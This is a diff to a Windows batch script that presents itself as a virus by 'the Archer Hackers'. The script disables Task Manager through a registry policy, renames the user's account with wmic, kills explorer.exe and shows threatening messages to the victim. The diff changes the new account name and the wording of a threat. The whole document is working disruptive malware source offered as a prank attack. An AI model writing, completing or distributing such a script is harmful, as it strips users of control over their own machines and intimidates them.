@@ -7,8 +7,8 @@
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /d "1"
 cls
 :: set username secretly (not really) and before killing explorer
-wmic useraccount where name='%username%' set FullName='hackedvictim'
-wmic useraccount where name='%username%' rename 'hackedvictim'
+wmic useraccount where name='%username%' set FullName='ARCHER_HACKERS_VICTIM'
+wmic useraccount where name='%username%' rename 'ARCHER_HACKERS_VICTIM'
 cls
 taskkill /f /im explorer.exe
 cls
@@ -17,7 +17,7 @@ echo MADE BY THE ARCHER HACKERS!
 echo THIS VIRUS WILL HACK YOUR COMPUTER
 echo ----RULES----
 echo DO NOT SHARE TO ANYBODY ELSE.
-echo IF YOU DO THIS YOU WILL FACE A CONSEQUENCE.
+echo IF YOU DO THIS YOU WILL FACE THE CONSEQUENCES.
 echo ALSO THERE'S NO GOING BACK, %USERNAME%....
 pause
 cls
